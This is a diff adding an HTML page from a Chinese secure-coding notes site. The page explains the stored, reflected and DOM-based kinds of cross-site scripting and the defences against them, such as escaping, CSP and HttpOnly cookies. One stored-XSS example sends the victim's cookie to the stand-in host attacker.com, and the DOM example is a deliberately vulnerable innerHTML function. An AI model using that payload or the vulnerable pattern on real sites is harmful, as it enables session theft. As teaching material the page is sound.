@@ -1,0 +1,1105 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web安全漏洞与Python高级编程学习笔记">
+      
+      
+      
+        <link rel="canonical" href="https://mydomain.org/secure-dev-guide/web-security/xss/">
+      
+      
+        <link rel="prev" href="../sql-injection/">
+      
+      
+        <link rel="next" href="../csrf/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>XSS跨站脚本 - 安全开发笔记库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xss-cross-site-scripting" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="安全开发笔记库" class="md-header__button md-logo" aria-label="安全开发笔记库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            安全开发笔记库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XSS跨站脚本
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../overview/" class="md-tabs__link">
+          
+  
+  
+  Web安全漏洞
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../python-advanced/overview/" class="md-tabs__link">
+          
+  
+  
+  Python高级编程
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="安全开发笔记库" class="md-nav__button md-logo" aria-label="安全开发笔记库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    安全开发笔记库
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    首页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web安全漏洞
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web安全漏洞
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    概述
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL注入
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    XSS跨站脚本
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    XSS跨站脚本
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      什么是XSS？
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS的工作原理
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS的三种主要类型
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS的三种主要类型">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-xss-stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 存储型XSS (Stored XSS)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-xss-reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 反射型XSS (Reflected XSS)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-domxss-dom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. DOM型XSS (DOM-based XSS)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS攻击示例
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS攻击示例">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      存储型XSS示例
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      反射型XSS示例
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domxss" class="md-nav__link">
+    <span class="md-ellipsis">
+      DOM型XSS示例
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS的防御措施
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS的防御措施">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 输入验证和过滤
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 输出编码
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-content-security-policy-csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Content Security Policy (CSP)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-httponly-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. 使用HttpOnly Cookie
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-x-xss-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. 实施X-XSS-Protection头
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-javascript-api" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. 使用安全的JavaScript API
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. 实施输入长度限制
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      安全编码最佳实践
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CSRF跨站请求伪造
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../command-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    命令注入
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file-upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    文件上传漏洞
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    认证与授权
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Python高级编程
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Python高级编程
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python-advanced/overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    概述
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python-advanced/oop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    面向对象编程
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python-advanced/multithreading/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    多线程编程
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python-advanced/coroutines/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    协程与异步编程
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../python-advanced/concurrency-best-practices/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    并发编程最佳实践
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="xss-cross-site-scripting">XSS跨站脚本攻击 (Cross-Site Scripting)<a class="headerlink" href="#xss-cross-site-scripting" title="Permanent link">&para;</a></h1>
+<h2 id="xss">什么是XSS？<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
+<p>跨站脚本攻击（Cross-Site Scripting，简称XSS）是一种常见的Web安全漏洞，攻击者通过在Web页面中注入恶意脚本，当其他用户浏览该页面时，脚本会在用户浏览器中执行。这可能导致会话劫持、数据盗窃、网站篡改等严重后果。</p>
+<h2 id="xss_1">XSS的工作原理<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h2>
+<p>XSS攻击发生在Web应用程序没有正确验证或转义用户输入的情况下。攻击者将恶意JavaScript代码注入到页面中，当其他用户访问包含这些代码的页面时，浏览器会执行这些代码，就像它们是页面的合法组成部分一样。</p>
+<h2 id="xss_2">XSS的三种主要类型<a class="headerlink" href="#xss_2" title="Permanent link">&para;</a></h2>
+<h3 id="1-xss-stored-xss">1. 存储型XSS (Stored XSS)<a class="headerlink" href="#1-xss-stored-xss" title="Permanent link">&para;</a></h3>
+<p><strong>特点</strong>：恶意脚本被永久存储在目标服务器上（如数据库、留言板、评论区等）。</p>
+<p><strong>攻击流程</strong>：
+1. 攻击者将恶意脚本提交到目标网站的数据库中
+2. 其他用户浏览包含恶意脚本的页面
+3. 恶意脚本在用户浏览器中执行</p>
+<p><strong>影响范围</strong>：影响所有访问该页面的用户，危害较大。</p>
+<p><strong>典型场景</strong>：论坛评论、用户资料、博客文章等用户可提交内容的地方。</p>
+<h3 id="2-xss-reflected-xss">2. 反射型XSS (Reflected XSS)<a class="headerlink" href="#2-xss-reflected-xss" title="Permanent link">&para;</a></h3>
+<p><strong>特点</strong>：恶意脚本包含在URL中，当用户点击特制的URL时，脚本被反射到用户浏览器中执行。</p>
+<p><strong>攻击流程</strong>：
+1. 攻击者构造包含恶意脚本的URL
+2. 诱导用户点击该URL
+3. 当用户访问URL时，恶意脚本被反射到浏览器并执行</p>
+<p><strong>影响范围</strong>：通常只影响点击链接的特定用户。</p>
+<p><strong>典型场景</strong>：搜索页面、错误页面、URL参数直接显示在页面的地方。</p>
+<h3 id="3-domxss-dom-based-xss">3. DOM型XSS (DOM-based XSS)<a class="headerlink" href="#3-domxss-dom-based-xss" title="Permanent link">&para;</a></h3>
+<p><strong>特点</strong>：漏洞存在于客户端代码中，恶意脚本不会经过服务器，而是通过修改页面的DOM结构来执行。</p>
+<p><strong>攻击流程</strong>：
+1. 攻击者构造特制URL或诱导用户执行特定操作
+2. 客户端JavaScript代码处理URL或用户操作时产生漏洞
+3. 恶意脚本在客户端执行</p>
+<p><strong>影响范围</strong>：取决于漏洞的性质和攻击方式。</p>
+<p><strong>典型场景</strong>：使用<code>document.write()</code>、<code>eval()</code>、<code>innerHTML</code>等操作DOM的地方。</p>
+<h2 id="xss_3">XSS攻击示例<a class="headerlink" href="#xss_3" title="Permanent link">&para;</a></h2>
+<h3 id="xss_4">存储型XSS示例<a class="headerlink" href="#xss_4" title="Permanent link">&para;</a></h3>
+<p>攻击者在评论区提交以下内容：</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/steal.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>当其他用户查看此评论时，恶意脚本会执行并将用户的cookie发送到攻击者的服务器。</p>
+<h3 id="xss_5">反射型XSS示例<a class="headerlink" href="#xss_5" title="Permanent link">&para;</a></h3>
+<p>攻击者构造如下URL：</p>
+<div class="codehilite"><pre><span></span><code>http://example.com/search.php?q=<span class="nt">&lt;script&gt;</span>alert(&#39;XSS&#39;)<span class="nt">&lt;/script&gt;</span>
+</code></pre></div>
+
+<p>如果网站直接将搜索参数显示在页面上而不进行转义，当用户点击此链接时，会弹出alert对话框。</p>
+<h3 id="domxss">DOM型XSS示例<a class="headerlink" href="#domxss" title="Permanent link">&para;</a></h3>
+<p>假设有如下JavaScript代码：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">displaySearchQuery</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">search</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">search</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;q=&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;search-results&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;搜索结果: &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">query</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>攻击者可以构造URL：</p>
+<div class="codehilite"><pre><span></span><code>http://example.com/search.html?q=&lt;img src=x onerror=alert(&#39;DOM XSS&#39;)&gt;
+</code></pre></div>
+
+<h2 id="xss_6">XSS的防御措施<a class="headerlink" href="#xss_6" title="Permanent link">&para;</a></h2>
+<h3 id="1">1. 输入验证和过滤<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p>对所有用户输入进行严格的验证和过滤，确保输入符合预期的格式。</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Python中使用html模块转义</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">sanitize_input</span><span class="p">(</span><span class="n">user_input</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+
+<span class="c1"># 使用</span>
+<span class="n">user_input</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="n">safe_input</span> <span class="o">=</span> <span class="n">sanitize_input</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+</code></pre></div>
+
+<h3 id="2">2. 输出编码<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<p>在将用户提供的数据输出到页面之前，进行适当的HTML编码，确保特殊字符不会被解释为HTML或JavaScript代码。</p>
+<p><strong>JavaScript中使用</strong>：</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 使用textContent而不是innerHTML</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userInput</span><span class="p">;</span>
+
+<span class="c1">// 或者手动转义</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">text</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;/g</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;amp;&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;lt;&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;gt;&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&quot;/g</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;quot;&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#39;/g</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;#039;&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3 id="3-content-security-policy-csp">3. Content Security Policy (CSP)<a class="headerlink" href="#3-content-security-policy-csp" title="Permanent link">&para;</a></h3>
+<p>实现内容安全策略，限制浏览器可以执行的脚本来源，有效防止XSS攻击。</p>
+<p>在HTTP头中设置：</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">Content-Security-Policy</span><span class="o">:</span><span class="w"> </span><span class="nt">default-src</span><span class="w"> </span><span class="s1">&#39;self&#39;</span><span class="o">;</span><span class="w"> </span><span class="nt">script-src</span><span class="w"> </span><span class="s1">&#39;self&#39;</span><span class="w"> </span><span class="nt">trusted-cdn</span><span class="p">.</span><span class="nc">com</span>
+</code></pre></div>
+
+<p>或者在HTML中设置：</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-Security-Policy&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;default-src &#39;self&#39;; script-src &#39;self&#39; trusted-cdn.com&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<h3 id="4-httponly-cookie">4. 使用HttpOnly Cookie<a class="headerlink" href="#4-httponly-cookie" title="Permanent link">&para;</a></h3>
+<p>将Cookie设置为HttpOnly，可以防止JavaScript访问Cookie，减轻XSS攻击的危害。</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">Set-Cookie</span><span class="o">:</span><span class="w"> </span><span class="nt">sessionid</span><span class="o">=</span><span class="nt">abc123</span><span class="o">;</span><span class="w"> </span><span class="nt">HttpOnly</span><span class="o">;</span><span class="w"> </span><span class="nt">Secure</span><span class="o">;</span><span class="w"> </span><span class="nt">SameSite</span><span class="o">=</span><span class="nt">Strict</span>
+</code></pre></div>
+
+<h3 id="5-x-xss-protection">5. 实施X-XSS-Protection头<a class="headerlink" href="#5-x-xss-protection" title="Permanent link">&para;</a></h3>
+<p>启用浏览器内置的XSS过滤功能。</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">X-XSS-Protection</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">mode</span><span class="o">=</span><span class="nt">block</span>
+</code></pre></div>
+
+<h3 id="6-javascript-api">6. 使用安全的JavaScript API<a class="headerlink" href="#6-javascript-api" title="Permanent link">&para;</a></h3>
+<p>避免使用危险的JavaScript函数，如：
+- <code>eval()</code>
+- <code>document.write()</code>
+- <code>innerHTML</code>（不经过验证的情况下）
+- <code>setTimeout()</code>和<code>setInterval()</code>（使用字符串参数时）</p>
+<h3 id="7">7. 实施输入长度限制<a class="headerlink" href="#7" title="Permanent link">&para;</a></h3>
+<p>限制用户输入的长度，减少攻击面。</p>
+<h2 id="_1">安全编码最佳实践<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ol>
